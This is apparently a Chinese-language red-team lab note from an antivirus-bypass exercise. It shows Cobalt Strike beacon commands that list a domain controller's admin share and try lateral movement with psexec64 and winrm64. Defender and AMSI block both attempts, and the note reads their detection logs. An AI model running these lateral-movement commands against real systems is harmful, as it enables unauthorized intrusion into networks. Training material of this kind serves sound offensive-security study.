# Bypassing Antivirus

可以列举C盘，但是无法横向，考虑bypass antivirus，如下显示
```
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
...<skip>...

beacon> jump psexec64 dc-2 smb
[-] Could not start service c8e8647 on dc-2: 225
[-] Could not connect to pipe: 2

beacon> jump winrm64 dc-2 smb
[-] Could not connect to pipe: 2

#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+  Set-StrictMode -Version 2_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParseException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error">    + PSComputerName        : dc-2_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
```

上面xml文字出现了**This script contains malicious content and has been blocked by your antivirus software**字样，表明程序被AMSI（antimalware scan interface）杀掉了

```Get-MpThreatDetection```是一个 Windows Defender cmdlet，可以显示检测到的威胁
```
beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources

ActionSuccess  : True
DomainUser     : 
ProcessName    : Unknown
Resources      : {file:_C:\Windows\c8e8647.exe, file:_\\dc-2\ADMIN$\c8e8647.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04

ActionSuccess  : True
DomainUser     : DEV\nlamb
ProcessName    : C:\Windows\System32\wsmprovhost.exe
Resources      : {amsi:_C:\Windows\System32\wsmprovhost.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04
```

第一条是尝试使用```psexec64```,可执行程序```c8e8647.exe```已自动上传到靶机，但是被侦测到并被从硬盘上删除。

第二条是尝试使用```winrm64```,```wsmprovhost.exe```被AMSI从内存中侦测到，并且被阻止执行。